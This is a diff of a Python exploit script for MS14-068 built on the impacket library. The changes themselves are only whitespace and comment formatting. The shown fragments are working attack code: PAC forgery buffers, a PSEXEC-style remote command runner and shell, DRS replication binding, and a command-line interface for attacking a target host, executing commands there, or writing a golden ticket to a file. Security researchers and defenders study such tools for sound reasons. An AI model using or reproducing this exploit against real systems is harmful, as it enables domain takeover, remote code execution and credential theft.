@@ -68,12 +68,12 @@ from impacket.krb5.types import Principal, Ticket, KerberosTime
 from impacket.krb5 import constants
 from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT, getKerberosTGS, KerberosError
 from impacket.krb5.asn1 import AS_REP, TGS_REQ, AP_REQ, TGS_REP, Authenticator, EncASRepPart, AuthorizationData, \
-        AD_IF_RELEVANT, seq_set, seq_set_iter, KERB_PA_PAC_REQUEST, \
-        EncTGSRepPart, ETYPE_INFO2_ENTRY
+    AD_IF_RELEVANT, seq_set, seq_set_iter, KERB_PA_PAC_REQUEST, \
+    EncTGSRepPart, ETYPE_INFO2_ENTRY
 from impacket.krb5.crypto import Key
 from impacket.dcerpc.v5.ndr import NDRULONG
 from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, \
-        SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
+    SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
 from pyasn1.codec.der import decoder, encoder
 from Crypto.Hash import MD5
 
@@ -210,7 +210,7 @@ class PSEXEC1:
             #ans = s.readNamedPipe(tid,fid_main,8)
             if len(ans):
                 retCode = RemComResponse(ans)
-                #print getOutput()
+                # print getOutput()
                 logging.info(
                     "Process %s finished with ErrorCode: %d, ReturnCode: %d" %
                     (self.__command, retCode['ErrorCode'],
@@ -221,7 +221,7 @@ class PSEXEC1:
                 s.deleteFile(installService.getShare(),
                              os.path.basename(self.__copyFile))
             unInstalled = True
-            #sys.exit(retCode['ErrorCode'])
+            # sys.exit(retCode['ErrorCode'])
 
         except SystemExit:
             raise
@@ -232,7 +232,7 @@ class PSEXEC1:
                     s.deleteFile(installService.getShare(),
                                  os.path.basename(self.__copyFile))
             sys.stdout.flush()
-            #sys.exit(1)
+            # sys.exit(1)
 
     def openPipe(self, s, tid, pipe, accessMask):
         pipeReady = False
@@ -318,8 +318,8 @@ class RemoteStdOutPipe(Pipes):
                     global LastDataSent
                     if ans != LastDataSent:
                         totalOutput += ans
-                    #sys.stdout.write(ans)
-                    #sys.stdout.flush()
+                    # sys.stdout.write(ans)
+                    # sys.stdout.flush()
                     else:
                         # Don't echo what I sent, and clear it up
                         LastDataSent = ''
@@ -365,8 +365,8 @@ class RemoteShell(cmd.Cmd):
         self.intro = ''
 
 
-#[!] Press help for extra shell commands'
-#def postloop(self):
+# [!] Press help for extra shell commands'
+# def postloop(self):
 #	return
 
     def connect_transferClient(self):
@@ -739,7 +739,7 @@ class MS14_068:
         buffers = str(validationInfoIB) + str(pacClientInfoIB) + str(
             serverChecksumIB) + str(
                 privSvrChecksumIB
-            ) + validationInfoBlob + validationInfoAlignment + str(
+        ) + validationInfoBlob + validationInfoAlignment + str(
                 pacClientInfo) + pacClientInfoAlignment
         buffersTail = str(serverChecksum) + serverChecksumAlignment + str(
             privSvrChecksum) + privSvrChecksumAlignment
@@ -969,7 +969,7 @@ class MS14_068:
         request = DRSBind()
         request['puuidClientDsa'] = NTDSAPI_CLIENT_GUID
         drs = DRS_EXTENSIONS_INT()
-        drs['cb'] = len(drs)  #- 4
+        drs['cb'] = len(drs)  # - 4
         drs['dwFlags'] = DRS_EXT_GETCHGREQ_V6 | DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_GETCHGREQ_V8 | DRS_EXT_STRONG_ENCRYPTION
         drs['SiteObjGuid'] = NULLGUID
         drs['Pid'] = 0
@@ -1217,8 +1217,7 @@ if __name__ == '__main__':
 
     parser = argparse.ArgumentParser(
         add_help=True,
-        description=
-        "MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the "
+        description="MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the "
         "target or saves the TGT for later use.")
 
     parser.add_argument('target',
@@ -1231,23 +1230,20 @@ if __name__ == '__main__':
         'command',
         nargs='*',
         default=' ',
-        help=
-        'command (or arguments if -c is used) to execute at the target (w/o path). Defaults to '
+        help='command (or arguments if -c is used) to execute at the target (w/o path). Defaults to '
         'cmd.exe. \'None\' will not execute PSEXEC (handy if you just want to save the ticket)'
     )
     parser.add_argument(
         '-c',
         action='store',
         metavar="pathname",
-        help=
-        'uploads the filename for later execution, arguments are passed in the command option'
+        help='uploads the filename for later execution, arguments are passed in the command option'
     )
     parser.add_argument(
         '-w',
         action='store',
         metavar="pathname",
-        help=
-        'writes the golden ticket in CCache format into the <pathname> file')
+        help='writes the golden ticket in CCache format into the <pathname> file')
     parser.add_argument(
         '-dc-ip',
         action='store',
@@ -1259,8 +1255,7 @@ if __name__ == '__main__':
         '-target-ip',
         action='store',
         metavar="ip address",
-        help=
-        'IP Address of the target host you want to attack. If ommited it will use the targetName '
+        help='IP Address of the target host you want to attack. If ommited it will use the targetName '
         'parameter')
 
     group = parser.add_argument_group('authentication')
@@ -1290,7 +1285,7 @@ if __name__ == '__main__':
         '(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
             options.target).groups('')
 
-    #In case the password contains '@'
+    # In case the password contains '@'
     if '@' in address:
         password = password + '@' + address.rpartition('@')[0]
         address = address.rpartition('@')[2]
@@ -1319,5 +1314,5 @@ if __name__ == '__main__':
         dumper.exploit()
     except Exception, e:
         #import traceback
-        #print traceback.print_exc()
+        # print traceback.print_exc()
         logging.critical(str(e))
